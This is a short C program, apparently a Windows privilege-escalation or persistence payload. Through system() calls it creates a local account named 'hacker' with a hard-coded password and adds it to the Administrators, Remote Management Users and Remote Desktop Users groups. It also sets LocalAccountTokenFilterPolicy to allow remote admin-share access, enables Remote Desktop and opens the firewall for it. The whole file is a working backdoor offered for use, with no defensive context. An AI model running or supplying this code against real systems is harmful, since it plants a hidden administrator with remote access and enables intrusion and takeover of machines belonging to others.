#include <stdlib.h>

int main ()
{
	int i;
 
       	// Add user	
	i = system ("net user hacker Password1!abc /add");
       	
	// Add user to Administrators group
	i = system ("net localgroup Administrators hacker /add");
	
	// Add user to Remote Management Users group
	i = system ("net localgroup \"remote management users\" hacker /add");
	
	// Add user to Remote Desktop Users group
	i = system ("net localgroup \"remote desktop users\" hacker /add");
	
	// Enable writable admin shares
	i = system ("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
	
	// Enable RDP and allow in firewall 
	i = system ("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
	i = system ("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
	  
	return 0;
}
